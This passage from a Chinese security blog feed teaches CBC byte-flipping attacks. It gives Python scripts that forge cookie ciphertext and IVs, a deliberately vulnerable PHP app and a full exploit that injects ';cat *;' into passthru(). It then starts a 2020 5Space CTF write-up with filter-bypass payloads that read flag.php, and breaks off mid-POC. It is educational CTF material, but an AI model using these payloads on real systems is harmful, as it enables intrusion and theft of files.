class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">cipher = <span class="string">&#x27;EvX06IpeOJ9iTJ7J1L9iP7ymKC1Phg7KySWJP0ZbAtlwVMnniIkdvRH60+BY5g+8i0WKbQvgJIZVbGsQGTzH5A==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">old = <span class="string">&quot;me\&quot;;s:5:\&quot;skctf\&quot;;&quot;</span></span><br><span class="line">new = <span class="string">&quot;me\&quot;;s:5:\&quot;admin\&quot;;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">    cipher = cipher[:i] + <span class="built_in">chr</span>(<span class="built_in">ord</span>(cipher[i]) ^ <span class="built_in">ord</span>(old[i]) ^ <span class="built_in">ord</span>(new[i])) + cipher[i+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> cipher.encode(<span class="string">&#x27;base64&#x27;</span>).strip()</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9113969-f295a006c62892a3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>用上面生成的密文修改cookie：cipher，访问，因为不能正常反序列化，所以报错返回一个cbc解密后的明文值。<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-6bc8562d5baf2a10.png" alt="图片.png"><br>4.根据CBC解密原理，修改第一块的密文可以达到修改第二块明文的结果，但同时也破坏了第一块明文。所以我们需要修复被破坏的第一块明文。根据上面得到的破坏后的明文，让他与原来的IV进行异或得到第一组的中间值，然后用这个中间值去跟修补后的明文异或从而得到一个新的IV，提交这个新的IV和cipher即可得到flag。<br>可以利用下面的脚本重新生成IV：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">plain = <span class="string">&#x27;uSb7VZM9bSikP7AiZD5F5m1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjQ6IjIzMzMiO30=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">iv = <span class="string">&#x27;KvfyPMU0MPU2PalcPn3TwA==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">old = plain[:<span class="number">16</span>]</span><br><span class="line">new = <span class="string">&quot;a:2:&#123;s:8:\&quot;userna&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">    iv = iv[:i] + <span class="built_in">chr</span>(<span class="built_in">ord</span>(iv[i]) ^ <span class="built_in">ord</span>(old[i]) ^ <span class="built_in">ord</span>(new[i])) + iv[i+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> iv.encode(<span class="string">&#x27;base64&#x27;</span>).strip()</span><br></pre></td></tr></table></figure><p>用生成的新IV替换cookie中的IV<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-b9994a76134aa880.png" alt="图片.png"></p><h2 id="0x08-练习"><a href="#0x08-练习" class="headerlink" title="0x08 练习"></a>0x08 练习</h2><p>下面是上面练习当中的PHP源码及exp：</p><p><strong>PHP code:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;MY_AES_KEY&#x27;</span>, <span class="string">&quot;abcdef0123456789&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;MY_HMAC_KEY&#x27;</span>,<span class="string">&quot;1234567890123456&quot;</span> );</span><br><span class="line"><span class="comment">#define(&quot;FLAG&quot;,&quot;CENSORED&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$encrypt</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$aes</span> = <span class="title function_ invoke__">mcrypt_module_open</span>(MCRYPT_RIJNDAEL_128, <span class="string">&#x27;&#x27;</span>, MCRYPT_MODE_CBC, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="variable">$iv</span> = <span class="title function_ invoke__">mcrypt_create_iv</span> (<span class="title function_ invoke__">mcrypt_enc_get_iv_size</span>(<span class="variable">$aes</span>), MCRYPT_RAND);</span><br><span class="line"><span class="variable">$iv</span> = <span class="string">&quot;1234567891234567&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mcrypt_generic_init</span>(<span class="variable">$aes</span>, MY_AES_KEY, <span class="variable">$iv</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$encrypt</span> ? <span class="title function_ invoke__">mcrypt_generic</span>(<span class="variable">$aes</span>, <span class="variable">$data</span>) : <span class="title function_ invoke__">mdecrypt_generic</span>(<span class="variable">$aes</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;MY_MAC_LEN&#x27;</span>, <span class="number">40</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hmac</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha1&#x27;</span>, data, MY_HMAC_KEY);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">aes</span>(<span class="variable">$data</span> . <span class="title function_ invoke__">hmac</span>(<span class="variable">$data</span>), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">rtrim</span>(<span class="title function_ invoke__">aes</span>(<span class="variable">$data</span>, <span class="literal">false</span>), <span class="string">&quot;\0&quot;</span>);</span><br><span class="line"><span class="variable">$mac</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, -MY_MAC_LEN);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="number">0</span>, -MY_MAC_LEN);</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">hmac</span>(<span class="variable">$data</span>) === <span class="variable">$mac</span> ? <span class="variable">$data</span> : <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$settings</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$_COOKIE</span>[<span class="string">&#x27;settings&#x27;</span>]) &#123;</span><br><span class="line"><span class="keyword">echo</span> @<span class="title function_ invoke__">decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;settings&#x27;</span>]));</span><br><span class="line"><span class="variable">$settings</span> = <span class="title function_ invoke__">unserialize</span>(@<span class="title function_ invoke__">decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;settings&#x27;</span>])));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]) &lt; <span class="number">200</span>) &#123;</span><br><span class="line"><span class="variable">$settings</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;name&#x27;</span> =&gt; <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>],</span><br><span class="line"><span class="string">&#x27;greeting&#x27;</span> =&gt; (<span class="string">&#x27;echo &#x27;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="string">&quot;Hello <span class="subst">&#123;$_POST[&#x27;name&#x27;]&#125;</span>!&quot;</span>)),</span><br><span class="line">);</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;settings&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(@<span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$settings</span>))));</span><br><span class="line"><span class="comment">#setcookie(&#x27;settings&#x27;, serialize($settings));</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$settings</span>[<span class="string">&#x27;greeting&#x27;</span>]) &#123;</span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="variable">$settings</span>[<span class="string">&#x27;greeting&#x27;</span>]);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;</span></span><br><span class="line"><span class="string">&lt;form action=&quot;</span>\<span class="string">&quot;?\&quot;&quot;</span> method=<span class="string">&quot;\&quot;POST\&quot;&quot;</span>&gt;\n<span class="string">&quot;;</span></span><br><span class="line"><span class="string">echo &quot;</span></span><br><span class="line">What is your name?</span><br><span class="line"></span><br><span class="line">\n<span class="string">&quot;;</span></span><br><span class="line"><span class="string">echo &quot;</span>&lt;input type=<span class="string">&quot;\&quot;text\&quot;&quot;</span> name=<span class="string">&quot;\&quot;name\&quot;&quot;</span> /&gt;\n<span class="string">&quot;;</span></span><br><span class="line"><span class="string">echo &quot;</span>&lt;input type=<span class="string">&quot;\&quot;submit\&quot;&quot;</span> name=<span class="string">&quot;\&quot;submit\&quot;&quot;</span> value=<span class="string">&quot;\&quot;Submit\&quot;&quot;</span> /&gt;\n<span class="string">&quot;;</span></span><br><span class="line"><span class="string">echo &quot;</span>&lt;/form&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">\n<span class="string">&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中，在POST提交参数”name”的任何文本值之后，应用程序则会对应输出”Hello”加上最后提交的文本。但是有两件事情发生在消息打印之前：</p><ol><li>POST参数”name”值被PHP函数escapeshellarg()过滤（转换单引号，防止恶意命令注入），然后将其存储在Array-&gt;greeting当中，最后加密该值来产生cookie。</li><li>Array-&gt;greeting当中的内容被PHP函数passthru()执行。</li><li>最后，在页面被访问的任何时间中，如果cookie已经存在，它会被解密，它的内容会通过passthru()函数执行。如前节所述，在这里CBC攻击会给我们一个不同的明文。</li></ol><p>然后构造了一个POST”name”的值来注入字符串：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&#x27;X&#x27;</span> + <span class="string">&#x27;;cat *;#a&#x27;</span></span><br></pre></td></tr></table></figure><p>首先添加了一个字符”X”，通过CBC翻转攻击将其替换成一个单引号，</p><p>然后 <code>;cat *;</code>命令将被执行，</p><p>最后的 <code>#</code>是用来注释，确保函数escapeshellarg()插入的单引号不会引起其他问题；</p><p>因此我们的命令就被成功执行。</p><p>在计算好之前的密码块中，要被改变的字节的确切偏移量（51）后，通过下面的代码来注入单引号：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pos = <span class="number">51</span>;</span><br><span class="line">val = <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="string">&#x27;X&#x27;</span>) ^ <span class="title function_ invoke__">ord</span>(<span class="string">&quot;&#x27;&quot;</span>) ^ <span class="title function_ invoke__">ord</span>(cookie[pos]))</span><br><span class="line">exploit = cookie[<span class="number">0</span>:pos] + val + cookie[pos + <span class="number">1</span>:]</span><br></pre></td></tr></table></figure><p>然后作者通过改变cookie（因为其具有全部的密文），得到以下结果：</p><p>[<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/a307d3d11ed50b0f3b36d6d031295be4adbb4b10.jpg" alt="img"></p><p>首先，因为我们改变了第一块，</p><p>所以在第二块中，黄色标记的”X”被成功替换为单引号，它被认为是多余插入（绿色），导致在unserialize()处理数据时产生一个错误（红色），</p><p>因此应用程序甚至都没有去尝试执行注入了。</p><p><strong>如何完善</strong></p><p>我们需要使我们的注入数据有效，那么我们在第一块中得到的额外数据，就不能在反序列化的过程中造成任何问题（unserialize()）。</p><p>一种方法是在我们的恶意命令中填充字母字符。因此我们尝试在注入字符串前后填充多个’z’：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&#x27;z&#x27;</span>*<span class="number">17</span> + <span class="string">&#x27;X&#x27;</span> + <span class="string">&#x27;;cat *;#&#x27;</span> + <span class="string">&#x27;z&#x27;</span>*<span class="number">16</span></span><br></pre></td></tr></table></figure><p>在发送上述字符串后，unserialize()并没有报错，并且我们的shell命令成功执行。</p><p><strong>Exploit:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode <span class="keyword">as</span> dec</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode <span class="keyword">as</span> enc</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://192.168.184.133/ebctf/mine.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Test</span>(<span class="params">x</span>):</span><br><span class="line">    t = <span class="string">&quot;echo &#x27;Hello %s!&#x27;&quot;</span> % x</span><br><span class="line">    s = <span class="string">&#x27;a:2:&#123;s:4:&quot;name&quot;;s:%s:&quot;%s&quot;;s:8:&quot;greeting&quot;;s:%s:&quot;%s&quot;;&#125;%s&#x27;</span> % (<span class="built_in">len</span>(x),x,<span class="built_in">len</span>(t),t, <span class="string">&#x27;X&#x27;</span>*<span class="number">40</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="built_in">len</span>(s),<span class="number">16</span>):</span><br><span class="line">        <span class="built_in">print</span> s[i:i+<span class="number">16</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Pwn</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">global</span> url</span><br><span class="line">    s = urllib.quote_plus(enc(s))</span><br><span class="line">    req = requests.get(url, cookies = &#123;<span class="string">&#x27;settings&#x27;</span> : s&#125;).content</span><br><span class="line"> <span class="comment">#   if req.find(&#x27;works&#x27;) != -1:</span></span><br><span class="line">    <span class="built_in">print</span> req</span><br><span class="line">  <span class="comment">#  else:</span></span><br><span class="line">   <span class="comment">#     print &#x27;[-] FAIL&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetCookie</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">global</span> url</span><br><span class="line">    d = &#123;</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>:name,</span><br><span class="line">        <span class="string">&#x27;submit&#x27;</span>:<span class="string">&#x27;Submit&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    h = requests.post(url, data = d, headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span> : <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;).headers</span><br><span class="line">    <span class="keyword">if</span> h.has_key(<span class="string">&#x27;set-cookie&#x27;</span>):</span><br><span class="line">        h = dec(urllib.unquote_plus(h[<span class="string">&#x27;set-cookie&#x27;</span>][<span class="number">9</span>:]))</span><br><span class="line">        <span class="comment">#h = urllib.unquote_plus(h[&#x27;set-cookie&#x27;][9:])</span></span><br><span class="line">        <span class="comment">#print h</span></span><br><span class="line">        <span class="keyword">return</span> h</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[-] ERROR&#x27;</span></span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#a:2:&#123;s:4:&quot;name&quot;;s:10:&quot;X;cat *;#a&quot;;s:8:&quot;greeting&quot;;s:24:&quot;echo &#x27;Hello X;cat *;#a!&#x27;&quot;;&#125;</span></span><br><span class="line"><span class="comment">#a:2:&#123;s:4:&quot;name&quot;;</span></span><br><span class="line"><span class="comment">#s:10:&quot;X;cat *;#a</span></span><br><span class="line"><span class="comment">#&quot;;s:8:&quot;greeting&quot;</span></span><br><span class="line"><span class="comment">#;s:24:&quot;echo &#x27;Hel</span></span><br><span class="line"><span class="comment">#lo X;cat *;#a!&#x27;&quot;</span></span><br><span class="line"><span class="comment">#;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#a:2:&#123;s:4:&quot;name&quot;;s:42:&quot;zzzzzzzzzzzzzzzzzX;cat *;#zzzzzzzzzzzzzzzz&quot;;s:8:&quot;greeting&quot;;s:56:&quot;echo &#x27;Hello zzzzzzzzzzzzzzzzzX;cat *;#zzzzzzzzzzzzzzzz!&#x27;&quot;;&#125;</span></span><br><span class="line"><span class="comment">#a:2:&#123;s:4:&quot;name&quot;;</span></span><br><span class="line"><span class="comment">#s:42:&quot;zzzzzzzzzz</span></span><br><span class="line"><span class="comment">#zzzzzzzX;cat *;#</span></span><br><span class="line"><span class="comment">#zzzzzzzzzzzzzzzz</span></span><br><span class="line"><span class="comment">#&quot;;s:8:&quot;greeting&quot;   </span></span><br><span class="line"><span class="comment">#;s:56:&quot;echo &#x27;Hel</span></span><br><span class="line"><span class="comment">#lo zzzzzzzzzzzzz</span></span><br><span class="line"><span class="comment">#zzzzX;cat *;#zzz</span></span><br><span class="line"><span class="comment">#zzzzzzzzzzzzz!&#x27;&quot;</span></span><br><span class="line"><span class="comment">#;&#125;</span></span><br><span class="line"><span class="comment">#exploit = &#x27;X&#x27; + &#x27;;cat *;#a&#x27; #Test case first, unsuccess</span></span><br><span class="line">exploit = <span class="string">&#x27;z&#x27;</span>*<span class="number">17</span> + <span class="string">&#x27;X&#x27;</span> + <span class="string">&#x27;;cat *;#&#x27;</span> + <span class="string">&#x27;z&#x27;</span> *<span class="number">16</span> <span class="comment"># Test Success</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#exploit = &quot;______________________________________________________; cat *;#&quot;</span></span><br><span class="line"><span class="comment">#Test(exploit)</span></span><br><span class="line">cookie = GetCookie(exploit)</span><br><span class="line">pos = <span class="number">100</span>; <span class="comment">#test case success</span></span><br><span class="line"><span class="comment">#pos = 51; #test case first, unsuccess</span></span><br><span class="line">val = <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;X&#x27;</span>) ^ <span class="built_in">ord</span>(<span class="string">&quot;&#x27;&quot;</span>) ^ <span class="built_in">ord</span>(cookie[pos]))</span><br><span class="line">exploit = cookie[<span class="number">0</span>:pos] + val + cookie[pos + <span class="number">1</span>:]</span><br><span class="line">Pwn(exploit)</span><br></pre></td></tr></table></figure><h2 id="0x09-参考"><a href="#0x09-参考" class="headerlink" title="0x09 参考"></a>0x09 参考</h2><p><a href="http://www.freebuf.com/articles/database/151167.html">Padding oracle attack详细解析</a><a href="https://kuraraneko.github.io/2018/01/14/Padding-Orlace/">Padding Orlace</a><a href="http://p0sec.net/index.php/archives/99/">CBC字节翻转攻击</a><a href="https://wooyun.l0ki.top/#!/drops/707.CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-101Approach">wooyunCBC字节翻转攻击-101Approach</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 5Space CTF Web Challenge</title>
      <link href="/2020/06/28/2020-5Space-CTF-Web/"/>
      <url>/2020/06/28/2020-5Space-CTF-Web/</url>
      
        <content type="html"><![CDATA[<h2 id="hate-php"><a href="#hate-php" class="headerlink" title="hate-php"></a>hate-php</h2><h3 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(f|l|a|g|\.|p|h|\/|;|\&quot;|\&#x27;|\`|\||\[|\]|\_|=)/i&#x27;</span>,<span class="variable">$code</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You are too good for me&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = <span class="title function_ invoke__">get_defined_functions</span>()[<span class="string">&#x27;internal&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span> (<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/im&#x27;</span>, <span class="variable">$code</span>)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;You deserve better&#x27;</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">assert</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(f|l|a|g|\.|p|h|\/|;|\&quot;|\&#x27;|\`|\||\[|\]|\_|=)/i&#x27;</span>,<span class="variable">$code</span></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><ul><li>flag在flag.php里面</li><li>get_defined_functions()函数获取所有已定义的函数</li><li>内置函数在blacklist黑名单中</li><li>绕过构造payload</li></ul><h3 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h3><ul><li>构造类似于<code>(phpinfo)();</code>这样的写法</li><li>构造payload</li><li>查看过滤</li></ul><h3 id="本题解法"><a href="#本题解法" class="headerlink" title="本题解法"></a>本题解法</h3><p>过滤了分号</p><p><strong>法一:</strong></p><ul><li>使用<code>(print_r)((scandir(&#39;.&#39;)))</code>来进行列目录</li><li>使用<code>(readfile)((‘flag.php’))</code>读取&#96;&#96;flag.php&#96;</li></ul><p><strong>法二:</strong></p><ul><li>使用命令&#96;&#96;(system)&#96;</li><li>使用命令&#96;&#96;(cat flag.php)&#96;</li></ul><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>= <span class="string">&quot;print_r&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="string">&quot;scandir&quot;</span>;</span><br><span class="line"><span 